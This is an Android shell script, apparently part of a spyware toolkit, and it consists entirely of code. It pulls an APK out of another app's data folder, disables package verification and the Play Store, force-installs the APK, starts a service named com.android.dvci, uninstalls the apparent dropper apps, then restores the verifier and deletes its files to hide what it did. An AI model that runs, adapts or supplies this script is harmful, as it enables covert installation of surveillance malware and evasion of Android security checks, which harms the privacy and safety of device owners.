
export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /sdcard/core.apk
cat /data/data/*/app_qza/core.*.apk > /sdcard/core.apk

settings put global package_verifier_enable 0
pm disable com.android.vending
sleep 1

pm install -f /sdcard/core.apk
sleep 2

am startservice com.android.dvci/.ServiceMain
am broadcast -a android.intent.action.USER_PRESENT
#pm disable com.android.deviceinfo
#pm uninstall com.android.deviceinfo

for geb in `ls /data/data/*/files/geb`; do
	init=${geb#/data/data/}
    package=${init%%/*}

    pm disable $package
    pm uninstall $package
done

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

rm /sdcard/core.apk
rm -r /sdcard/.lost.found
#rm -r /data/data/com.android.deviceinfo
#rm /data/app/com.android.deviceinfo*
#rm -r /data/app-lib/com.android.deviceinfo*





